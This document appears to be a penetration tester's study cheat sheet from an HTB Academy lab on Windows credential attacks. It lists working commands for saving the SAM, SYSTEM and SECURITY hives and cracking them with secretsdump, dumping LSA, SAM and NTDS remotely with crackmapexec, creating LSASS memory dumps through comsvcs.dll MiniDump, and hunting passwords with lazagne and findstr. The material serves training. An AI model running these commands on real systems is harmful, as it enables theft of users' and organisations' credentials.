
---
---

>  Attacking SAM

```c
# Using reg.exe save to Copy Registry Hives
C:\WINDOWS\system32> reg.exe save hklm\sam C:\sam.save
The operation completed successfully.
C:\WINDOWS\system32> reg.exe save hklm\system C:\system.save
The operation completed successfully.
C:\WINDOWS\system32> reg.exe save hklm\security C:\security.save
The operation completed successfully.

# And Transfer The FIles to My Machine & use secretdump.py to crackthem
python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
```

> Remote Dumping & LSA Secrets Considerations

```shell
# Dumping LSA 
c4ndy@htb[/htb]$ crackmapexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --lsa

# Dumping SAM Remotly
c4ndy@htb[/htb]$ crackmapexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --sam
```

> Attacking LSASS

```c
# Using GUI
Using GUI ? Open Task Manager > Select the Processes tab > Find & right click the Local Security Authority Process > Select Create dump file

A file called lsass.DMP is created and saved in: C:\Users\loggedonusersdirectory\AppData\Local\Temp

# Without GUI
Before issuing the command to create the dump file, we must determine what process ID (`PID`) is assigned to `lsass.exe`. This can be done from cmd or PowerShell:

1. From cmd, we can issue the command `tasklist /svc` and find lsass.exe and its process ID in the PID field.
2. PS > Get-Process lsass
3. PS > rundll32 C:\windows\system32\comsvcs.dll, MiniDump 672 C:\lsass.dmp full
4.  pypykatz lsa minidump /home/peter/Documents/lsass.dmp  (to dump the file)
```

> Attacking Active Directory & NTDS.dit

```c
# Create Out List  https://github.com/urbanadventurer/username-anarchy
┌──(root㉿offsec)-[/home/…/osep/tools/passwordAttacks/username-anarchy]
└─# ./username-anarchy --input-file ./test-names.txt  

# Attacking NTDS
crackmapexec smb 10.129.201.57 -u bwilliamson -p P@55w0rd! --ntds
```

> Credenatils Huntil In Windows

```c
# Find All Passwords
start lazagne.exe all

# Find All Files
findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml

# Using Winpease
.\winpease.exe 
```

---

# Credential Hunting In Windows

- [ ] Add This To Windows PrivEsc

```bash
# Try To Find ALl Passwords
C:\Users\bob\Desktop> start lazagne.exe all

# Using FindStr
C:\> findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml
```
